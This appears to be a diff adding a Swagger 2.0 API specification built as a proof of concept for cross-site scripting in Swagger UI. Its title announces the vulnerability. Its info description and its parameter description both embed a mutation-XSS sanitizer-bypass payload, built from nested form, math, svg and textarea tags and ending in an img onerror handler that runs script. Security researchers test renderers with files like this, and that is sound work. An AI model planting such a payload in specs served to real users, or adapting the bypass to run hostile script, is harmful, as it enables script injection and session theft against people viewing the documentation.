@@ -1,0 +1,29 @@
+swagger: '2.0'
+info:
+  title: This host is vulnerable to XSS (Cross-Site-Scripting)
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(document.domain)>"></form>
+
+  version: foo
+basePath: /Path/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /PoC:
+    get:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(document.domain)>"></form>
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - XSS_Swagger-UI
+      operationId: findAccounts
+      summary: Finds all accounts
